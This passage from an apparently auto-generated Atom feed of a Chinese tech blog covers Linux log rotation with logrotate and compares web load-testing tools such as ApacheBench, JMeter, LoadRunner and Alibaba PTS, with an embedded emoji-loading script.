document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;#x65E5;&amp;#x5FD7;&amp;#x6587;&amp;#x4EF6;&lt;/th&gt;
&lt;th&gt;&amp;#x8BF4;&amp;#x660E;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/var/log/message&lt;/t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的日志切割</title>
    <link href="https://marnm.github.io//posts/c4bbfe69/"/>
    <id>https://marnm.github.io//posts/c4bbfe69/</id>
    <published>2022-06-07T04:55:37.000Z</published>
    <updated>2022-06-07T04:59:33.087Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x9759;&#x6001;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x6CA1;&#x6709;&#x670D;&#x52A1;&#x5411;&#x91CC;&#x9762;&#x5199;&#x5185;&#x5BB9;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>split</code>&#x8FDB;&#x884C;&#x5207;&#x5272;<br>&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x662F;&#x52A8;&#x6001;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>logrotate</code> &#x8FDB;&#x884C;&#x5207;&#x5272;</p></blockquote><h3 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h3><p><code>/etc/logrotate.conf</code> &#x9884;&#x8BBE;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><h3 id="&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;"><a href="#&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;" class="headerlink" title="&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;"></a>&#x793A;&#x4F8B;&#xFF1A;&#x5BF9;ssh&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x5272;</h3><pre><code class="bash">vim /etc/logrotate.d/sshd/var/log/sshd.log{    missingok    weekly    create 0600 root root    minsize 1M    rotate 3}</code></pre><p><strong>&#x91CD;&#x542F;</strong></p><pre><code class="bash">systemctl restart rsyslog</code></pre><p><strong>&#x65E5;&#x5FD7;&#x5207;&#x5272;</strong></p><pre><code class="bash">logrotate -vf /etc/logrotate.d/sshd</code></pre><h3 id="&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;"><a href="#&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;" class="headerlink" title="&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;"></a>&#x65E5;&#x5FD7;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&amp;#x5982;&amp;#x679C;&amp;#x65E5;&amp;#x5FD7;&amp;#x662F;&amp;#x9759;&amp;#x6001;&amp;#x7684;&amp;#xFF0C;&amp;#x6BD4;&amp;#x5982;&amp;#x6CA1;&amp;#x6709;&amp;#x670D;&amp;#x52A1;&amp;#x5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>web性能压测学习</title>
    <link href="https://marnm.github.io//posts/d185f6ae/"/>
    <id>https://marnm.github.io//posts/d185f6ae/</id>
    <published>2022-06-07T04:55:14.000Z</published>
    <updated>2022-06-07T05:00:05.882Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;"><a href="#&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;" class="headerlink" title="&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;"></a>&#x5E38;&#x7528;&#x6027;&#x80FD;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#x5B9E;&#x6218;&#x603B;&#x7ED3;</h1><h2 id="&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;"><a href="#&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;" class="headerlink" title="&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;"></a>&#x4E00;&#x3001;&#x538B;&#x6D4B;&#x80CC;&#x666F;</h2><blockquote><p>&#x4EE5;&#x524D;&#xFF1A;&#x672A;&#x51FA;&#x793E;&#x4F1A;&#x4E4B;&#x524D;&#x7ECF;&#x5E38;&#x7528;AB&#x5DE5;&#x5177;&#x6765;&#x538B;&#x6D4B;&#x81EA;&#x5DF1;&#x7684; nginx &#x6B22;&#x8FCE;&#x9875;&#x9762;&#xFF0C;&#x770B;&#x7740;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#x4ECE;20%&#x5230;100%&#xFF0C;&#x53D1;&#x73B0;&#x539F;&#x6765;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#x90FD;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x53F0;4C8G&#x7684;&#x865A;&#x62DF;&#x673A;&#x538B;&#x7206;&#x6EE1;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x9677;&#x5165;&#x6C89;&#x601D;&#xFF0C;&#x4F4E;&#x6210;&#x672C;&#x7684;&#x538B;&#x6D4B;&#x90FD;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4E00;&#x53F0;&#x865A;&#x62DF;&#x673A;&#x7684;&#x8D44;&#x6E90;&#x6EE1;&#x8D1F;&#x8F7D;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x662F;&#x4E2A;&#x9759;&#x6001;&#x9875;&#x9762;&#xFF0C;&#x90A3;&#x5982;&#x679C;&#x53D1;&#x751F;&#x5728;&#x4F01;&#x4E1A;&#x8EAB;&#x4E0A;&#x4F1A;&#x5982;&#x4F55;&#xFF1F;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;&#x8FDC;&#x8FDC;&#x9AD8;&#x4E8E;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x540E;&#x679C;&#x4E0D;&#x6562;&#x60F3;&#x8C61;&#x3002;</p></blockquote><blockquote><p>&#x73B0;&#x5728;&#xFF1A;&#x6211;&#x627F;&#x8BA4;&#x4EE5;&#x524D;&#x592A;&#x5929;&#x771F;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x6709;&#x538B;&#x6D4B;&#x65B9;&#xFF0C;&#x90A3;&#x80AF;&#x5B9A;&#x6709;&#x9632;&#x5FA1;&#x65B9;&#xFF0C;&#x9047;&#x5230;&#x6076;&#x610F;&#x538B;&#x6D4B;&#x4ED6;&#x4EBA;&#x7F51;&#x7AD9;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x5168;&#x5BB6;&#x6876;&#x62C9;&#x9ED1;&#x3001;&#x5C4F;&#x853D;&#x6389;&#x5C31;&#x597D;&#x4E86;&#x3002;&#x90A3;&#x5BF9;&#x4E8E;&#x73B0;&#x5728;&#x4F01;&#x4E1A;&#x6765;&#x8BF4;&#xFF0C;&#x5404;&#x4EBA;&#x89C9;&#x5F97;&#x6700;&#x5927;&#x7684;&#x4EF7;&#x503C;&#x5C31;&#x662F;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#x3001;&#x589E;&#x5F3A;&#x4E1A;&#x52A1;&#x7A33;&#x5B9A;SLA&#x3001;&#x51CF;&#x5C11;&#x4E8B;&#x6545;&#x53D1;&#x751F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x4E8E;&#x6D4B;&#x8BD5;&#x8FD8;&#x662F;&#x8FD0;&#x7EF4;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x5929;&#x5927;&#x7684;&#x597D;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x4EF7;&#x503C;&#x7684;&#x4F53;&#x73B0;&#x3002;</p></blockquote><blockquote><p>&#x672A;&#x6765;&#xFF1A;&#x538B;&#x6D4B;&#x7684;&#x666E;&#x9002;&#x6027;&#xFF0C;&#x5BF9;&#x4F01;&#x4E1A;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x4E0D;&#x6B62;&#x63A2;&#x6D4B;&#x8D44;&#x6E90;&#x6027;&#x80FD;&#x3001;&#x8D44;&#x6E90;&#x5BB9;&#x91CF;&#x5408;&#x7406;&#x89C4;&#x5212;&#xFF0C;&#x8FD8;&#x6709;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5347;&#x7EA7;&#x9A8C;&#x8BC1;&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#x7EBF;&#x6D4B;&#x8BD5;&#x3001;&#x4E1A;&#x52A1;&#x5CF0;&#x503C;&#x7A33;&#x5B9A;&#x6027;&#x6D4B;&#x8BD5;&#x7B49;&#x7B49;&#xFF0C;&#x901A;&#x8FC7;&#x538B;&#x6D4B;&#x6E05;&#x695A;&#x8D44;&#x6E90;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x964D;&#x4F4E;&#x76F2;&#x76EE;&#x9884;&#x4F30;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x63D0;&#x9AD8;&#x670D;&#x52A1;&#x7684;&#x53EF;&#x7528;&#x6027;&#x548C;&#x7A33;&#x5B9A;&#x6027;&#x3002;</p></blockquote><p><strong>&#x6240;&#x4EE5;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x505A;&#x538B;&#x6D4B;&#xFF1F;</strong><br>&#x538B;&#x6D4B;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x538B;&#x6D4B;(&#x6A21;&#x62DF;&#x771F;&#x5B9E;&#x7528;&#x6237;&#x7684;&#x884C;&#x4E3A;)&#xFF0C;&#x6D4B;&#x7B97;&#x51FA;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;(&#x5355;&#x53F0;&#x673A;&#x5668;&#x7684;QPS)&#xFF0C;&#x4ECE;&#x800C;&#x63A8;&#x7B97;&#x51FA;&#x7CFB;&#x7EDF;&#x5728;&#x627F;&#x53D7;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6570;(100W)&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x591A;&#x5C11;&#x673A;&#x5668;&#x80FD;&#x652F;&#x6491;&#x5F97;&#x4F4F;&#x538B;&#x6D4B;&#x662F;&#x5728;&#x4E0A;&#x7EBF;&#x524D;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x672A;&#x6765;&#x53EF;&#x80FD;&#x8FBE;&#x5230;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x7684;&#x4E00;&#x6B21;&#x9884;&#x4F30;(&#x63D0;&#x524D;&#x6F14;&#x7EC3;)&#xFF0C;&#x538B;&#x6D4B;&#x4EE5;&#x540E;&#x901A;&#x8FC7;&#x4F18;&#x5316;&#x7A0B;&#x5E8F;&#x7684;&#x6027;&#x80FD;&#x6216;&#x51C6;&#x5907;&#x5145;&#x8DB3;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x6765;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x7684;&#x4F53;&#x9A8C;&#x3002;</p><h2 id="&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;"><a href="#&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;" class="headerlink" title="&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;"></a>&#x4E8C;&#x3001;&#x538B;&#x6D4B;&#x5DE5;&#x5177;</h2><ol><li>&#x5DE5;&#x5177;&#x8BF4;&#x660E;</li></ol><p>AB&#xFF1A;ApacheBench &#x662F; Apache&#x670D;&#x52A1;&#x5668;&#x81EA;&#x5E26;&#x7684;&#x4E00;&#x4E2A;web&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x7B80;&#x79F0;ab&#x3002;ab&#x53C8;&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x5BF9;&#x53D1;&#x8D77;&#x8D1F;&#x8F7D;&#x7684;&#x672C;&#x673A;&#x8981;&#x6C42;&#x5F88;&#x4F4E;&#xFF0C;&#x6839;&#x636E;ab&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x5F88;&#x591A;&#x7684;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#x7EBF;&#x7A0B;&#xFF0C;&#x6A21;&#x62DF;&#x591A;&#x4E2A;&#x8BBF;&#x95EE;&#x8005;&#x540C;&#x65F6;&#x5BF9;&#x67D0;&#x4E00;URL&#x5730;&#x5740;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6D4B;&#x8BD5;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x538B;&#x529B;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;ab&#x5DE5;&#x5177;&#x5C0F;&#x5DE7;&#x7B80;&#x5355;&#x3001;&#x975E;&#x5E38;&#x8F7B;&#x91CF;&#x5316;&#x7684;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x4E0A;&#x624B;&#x5B66;&#x4E60;&#x8F83;&#x5FEB;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9700;&#x8981;&#x7684;&#x57FA;&#x672C;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x56FE;&#x5F62;&#x5316;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x80FD;&#x76D1;&#x63A7;&#x3002;</p><p>Jmeter&#xFF1A;Apache JMeter&#x662F;Apache&#x7EC4;&#x7EC7;&#x5F00;&#x53D1;&#x7684;&#x57FA;&#x4E8E;Java&#x7684;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x7528;&#x4E8E;&#x5BF9;&#x8F6F;&#x4EF6;&#x505A;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#xFF0C;&#x5B83;&#x6700;&#x521D;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;Web&#x5E94;&#x7528;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F46;&#x540E;&#x6765;&#x6269;&#x5C55;&#x5230;&#x5176;&#x4ED6;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#x3002;JMeter&#x80FD;&#x591F;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x505A;&#x529F;&#x80FD;/&#x56DE;&#x5F52;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x5E26;&#x6709;&#x65AD;&#x8A00;&#x7684;&#x811A;&#x672C;&#x6765;&#x9A8C;&#x8BC1;&#x4F60;&#x7684;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x4E86;&#x4F60;&#x671F;&#x671B;&#x7684;&#x7ED3;&#x679C;&#x3002;</p><p>LoadRunner&#xFF1A;LR&#x662F;HP&#x63A8;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x548C;&#x6027;&#x80FD;&#x7684;&#x8D1F;&#x8F7D;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x6A21;&#x62DF;&#x4E0A;&#x5343;&#x4E07;&#x7528;&#x6237;&#x5B9E;&#x65BD;&#x5E76;&#x53D1;&#x8D1F;&#x8F7D;&#x53CA;&#x5B9E;&#x65F6;&#x6027;&#x80FD;&#x76D1;&#x6D4B;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x786E;&#x8BA4;&#x548C;&#x67E5;&#x627E;&#x95EE;&#x9898;&#xFF0C;&#x5206;&#x4E3A;Windows &#x7248;&#x672C;&#x548C;Unix &#x7248;&#x672C;&#x3002;LoadRunner&#x80FD;&#x591F;&#x5BF9;&#x6574;&#x4E2A;&#x4F01;&#x4E1A;&#x67B6;&#x6784;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x3002;&#x4F01;&#x4E1A;&#x4E5F;&#x80FD;&#x6700;&#x5927;&#x9650;&#x5EA6;&#x5730;&#x7F29;&#x77ED;&#x6D4B;&#x8BD5;&#x65F6;&#x95F4;&#xFF0C;&#x4F18;&#x5316;&#x6027;&#x80FD;&#x548C;&#x52A0;&#x901F;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x53D1;&#x5E03;&#x5468;&#x671F;&#x3002;&#x4E5F;&#x80FD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x5E76;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x3002;&#x5546;&#x4E1A;&#x7248;&#x652F;&#x6301;&#x5F55;&#x5C4F;+&#x811A;&#x672C;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p><p>&#x963F;&#x91CC;&#x4E91;PTS&#xFF1A;PTS&#xFF08;Performance Testing Service&#xFF09;&#x662F;&#x9762;&#x5411;&#x6240;&#x6709;&#x6280;&#x672F;&#x80CC;&#x666F;&#x4EBA;&#x5458;&#x7684;&#x4E91;&#x5316;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x6709;&#x522B;&#x4E8E;&#x4F20;&#x7EDF;&#x5DE5;&#x5177;&#x7684;&#x7E41;&#x590D;&#xFF0C;PTS&#x4EE5;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x4EA4;&#x4E92;&#xFF0C;&#x63D0;&#x4F9B;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;API&#x8C03;&#x8BD5;&#x548C;&#x76D1;&#x6D4B;&#x7B49;&#x591A;&#x79CD;&#x80FD;&#x529B;&#x3002;&#x81EA;&#x7814;&#x548C;&#x9002;&#x914D;&#x5F00;&#x6E90;&#x7684;&#x529F;&#x80FD;&#x90FD;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x6A21;&#x62DF;&#x4EFB;&#x610F;&#x4F53;&#x91CF;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4E1A;&#x52A1;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4EFB;&#x52A1;&#x968F;&#x65F6;&#x53D1;&#x8D77;&#xFF0C;&#x514D;&#x53BB;&#x7E41;&#x7410;&#x7684;&#x642D;&#x5EFA;&#x548C;&#x7EF4;&#x62A4;&#x6210;&#x672C;&#x3002;&#x66F4;&#x662F;&#x7D27;&#x5BC6;&#x7ED3;&#x5408;&#x76D1;&#x63A7;&#x3001;&#x6D41;&#x63A7;&#x7B49;&#x5144;&#x5F1F;&#x4EA7;&#x54C1;&#x63D0;&#x4F9B;&#x4E00;&#x7AD9;&#x5F0F;&#x9AD8;&#x53EF;&#x7528;&#x80FD;&#x529B;&#xFF0C;&#x9AD8;&#x6548;&#x68C0;&#x9A8C;&#x548C;&#x7BA1;&#x7406;&#x4E1A;&#x52A1;&#x6027;&#x80FD;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x6A21;&#x62DF;&#x9ED1;&#x5BA2;&#x5BF9;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x5168;&#x9762;&#x6DF1;&#x5165;&#x7684;&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#xFF0C;</p><ol start="2"><li>&#x5E38;&#x7528;&#x5DE5;&#x5177;&#x5BF9;&#x6BD4;</li></ol><table><thead><tr><th>&#x5BF9;&#x6BD4;&#x9879;\&#x538B;&#x6D4B;&#x5DE5;&#x5177;</th><th>Apache Bench&#xFF08;ab&#xFF09;</th><th>JMeter</th><th>LoadRunner</th><th>PTS</th></tr></thead><tbody><tr><td>&#x5B66;&#x4E60;&#x6210;&#x672C;</td><td>&#x4F4E;</td><td>&#x9AD8;</td><td>&#x9AD8;</td><td>&#x4F4E;</td></tr><tr><td>&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x6210;&#x672C;</td><td>&#x4F4E;</td><td>&#x9AD8;</td><td>&#x9AD8;</td><td>&#x4F4E;</td></tr><tr><td>&#x8D39;&#x7528;</td><td>&#x65E0;</td><td>&#x65E0;</td><td>&#x6709;</td><td>&#x6709;</td></tr><tr><td>&#x591A;&#x534F;&#x8BAE;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x56FE;&#x5F62;&#x5316;&#x5C55;&#x793A;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>TPS&#x6A21;&#x5F0F;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr><tr><td>&#x538B;&#x6D4B;&#x94FE;&#x8DEF;&#x3001;&#x573A;&#x666F;&#x7F16;&#x6392;&#x7BA1;&#x7406;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x573A;&#x666F;&#x5F55;&#x5236;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x751F;&#x6001;&#x73AF;&#x5883;&#x5F3A;&#x5F31;</td><td>&#x5F31;</td><td>&#x5F31;</td><td>&#x5F31;</td><td>&#x5F3A;</td></tr><tr><td>&#x76D1;&#x63A7;&#x6307;&#x6807;&#x662F;&#x5426;&#x5B8C;&#x5907;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr><tr><td>&#x6D41;&#x91CF;&#x5730;&#x57DF;&#x5B9A;&#x5236;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr></tbody></table><ol start="3"><li>&#x538B;&#x6D4B;&#x6807;&#x51C6;</li></ol><table><thead><tr><th>&#x538B;&#x6D4B;&#x7C7B;&#x578B;</th><th>&#x89E3;&#x91CA;&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>&#x538B;&#x529B;&#x6D4B;&#x8BD5;(Stress Testing)</td><td>&#x4E5F;&#x79F0;&#x4E4B;&#x4E3A;&#x5F3A;&#x5EA6;&#x6D4B;&#x8BD5;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x6700;&#x5927;&#x6297;&#x538B;&#x80FD;&#x529B;&#xFF0C;&#x5728;&#x5F3A;&#x8D1F;&#x8F7D;(&#x5927;&#x6570;&#x636E;&#x3001;&#x9AD8;&#x5E76;&#x53D1;)&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x6240;&#x80FD;&#x627F;&#x53D7;&#x7684;&#x6700;&#x5927;&#x538B;&#x529B;&#xFF0C;&#x9884;&#x4F30;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888;</td></tr><tr><td>&#x5E76;&#x53D1;&#x6D4B;&#x8BD5;(Concurrency Testing)</td><td>&#x901A;&#x8FC7;&#x6A21;&#x62DF;&#x5F88;&#x591A;&#x7528;&#x6237;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x5BF9;&#x7CFB;&#x7EDF;&#x67D0;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5E76;&#x53D1;&#x8BFB;&#x5199;&#x3001;&#x7EBF;&#x7A0B;&#x63A7;&#x5236;&#x3001;&#x8D44;&#x6E90;&#x4E89;&#x62A2;)</td></tr><tr><td>&#x8010;&#x4E45;&#x6027;&#x6D4B;&#x8BD5;(Configuration Testing)</td><td>&#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x5728;&#x5927;&#x8D1F;&#x8377;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x3001;&#x673A;&#x5668;&#x7684;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#x4E0B;&#x7684;&#x72B6;&#x51B5;,&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x3001;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x4E0D;&#x91CA;&#x653E;&#x3001;&#x8D44;&#x6E90;&#x4E0D;&#x56DE;&#x6536;)</td></tr></tbody></table><p>&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807;</p><p>3.1 &#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;  </p><blockquote><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7528;&#x6237;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5F00;&#x59CB;&#xFF0C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x7ED3;&#x675F;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x6240;&#x8017;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5728;&#x6027;&#x80FD;&#x68C0;&#x6D4B;&#x4E2D;&#x4E00;&#x822C;&#x4EE5;&#x538B;&#x529B;&#x53D1;&#x8D77;&#x7AEF;&#x81F3;&#x88AB;&#x538B;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x7684;&#x65F6;&#x95F4;&#x4E3A;&#x8BA1;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x4E00;&#x822C;&#x4E3A;&#x79D2;&#x6216;&#x6BEB;&#x79D2;&#x3002;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7CFB;&#x7EDF;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#xFF0C;&#x540C;&#x4E00;&#x4EA4;&#x6613;&#x7684;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x4E00;&#x822C;&#x800C;&#x8A00;&#xFF0C;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x5747;&#x6307;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002; 